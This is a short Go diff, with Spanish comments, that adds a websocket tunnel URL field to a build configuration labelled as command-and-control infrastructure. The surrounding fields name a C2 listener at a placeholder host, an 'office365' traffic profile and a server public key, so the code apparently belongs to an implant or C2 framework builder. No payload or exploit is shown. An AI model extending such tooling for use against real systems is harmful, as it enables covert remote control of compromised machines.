@@ -45,6 +45,7 @@ type BuildConfig struct {
 
 	// Infraestructura C2
 	ListenerURL  string // ej: "https://c2.example.com/api/v1/envelope"
+	WSURL        string // ej: "wss://c2.example.com:9444/ws/tunnel" (túneles)
 	ProfileName  string // ej: "office365"
 	ServerPubKey string // base64 de la clave pública X25519 del server
 
